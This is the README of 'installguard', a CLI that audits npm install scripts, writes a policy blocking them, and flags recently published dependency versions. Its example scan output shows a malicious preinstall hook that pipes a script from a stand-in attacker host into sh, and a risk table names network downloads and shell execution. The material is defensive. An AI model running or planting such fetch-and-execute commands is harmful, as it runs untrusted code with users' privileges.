# installguard

**See and control what runs code on your machine when you `npm install`.**

Every `preinstall` / `install` / `postinstall` hook in your dependency tree is arbitrary code
executing with your privileges — the vector behind the chalk/debug compromise and the
Shai-Hulud worm. npm v12 finally disables install scripts by default, but the two questions
it leaves you with are still manual:

1. *Which of my dependencies actually need a build step, and which are just running code?*
2. *Am I installing a release that was published minutes ago?*

`installguard` answers both, in one zero-dependency CLI.

```bash
npx installguard scan
npx installguard allow --write
npx installguard cooldown --days 7
```

## Commands

### `installguard scan`

Walks the installed tree (scoped + nested packages included) and lists every install hook,
classified and risk-ranked:

```
3 package(s) run code at install time

HIGH   sneaky@1.2.3
       preinstall [network-download] curl https://evil.example/x.sh | sh
MEDIUM sharp@0.33.0
       install [native-build] node-gyp rebuild
LOW    @scope/nag@2.0.0
       postinstall [funding-nag] node ./opencollective.js

summary: 1 high · 1 medium · 1 low
```

| Category | Meaning | Risk |
| --- | --- | --- |
| `network-download` | fetches something from the internet at install time | high |
| `shell-exec` | pipes to a shell, `eval`, `chmod`, `sudo` | high |
| `native-build` | node-gyp / prebuild / cmake-js — a real compile step | medium |
| `script-exec` | runs a JS file from the package | medium |
| `funding-nag` | opencollective/funding banner | low |

Flags: `--json`, `--min-risk low|medium|high`, `--dir <path>`, `--ci` (exit `1` when anything
at or above `high` — or the level you pass — is found).

### `installguard allow [--write]`

Turns the scan into the minimal policy: **block all install scripts, allow only genuine native
builds**. `--write` applies it — `ignore-scripts=true` in `.npmrc` and
`pnpm.onlyBuiltDependencies` in `package.json` (idempotent, keeps the rest of your file intact).
`--json` also prints ready-to-paste npm / pnpm / yarn config.

### `installguard cooldown [--days 7]`

Reads `package-lock.json`, asks the registry when each locked version was published, and flags
anything younger than the cooldown window — the period in which a hijacked publish is usually
still live and unreported.

```
2 of 412 locked versions are younger than 7 day(s)

    9h  some-lib@4.2.1 2026-09-04T15:02:11.000Z
   50h  other-lib@1.0.9 2026-09-02T22:41:00.000Z
```

Use `--ci` to fail a pipeline on fresh releases, or `--json` to feed it into your own gate.

## CI usage

```yaml
- run: npm ci --ignore-scripts
- run: npx installguard scan --ci
- run: npx installguard cooldown --days 3 --ci
```

## Programmatic API

```js
import { scanTree, buildAllowList, checkCooldown } from "installguard";

const findings = await scanTree(process.cwd());
const { allow, blocked } = buildAllowList(findings);
```

## Design notes

- **Zero runtime dependencies.** A supply-chain tool that drags in a dependency tree is a joke.
- **Node >= 18.17**, ESM, works with npm, pnpm, yarn and Bun installs.
- Classification is heuristic and deliberately conservative: it is a triage list, not a verdict.
- `cooldown` only talks to the registry (`INSTALLGUARD_REGISTRY` to override); nothing is uploaded.

## License

MIT
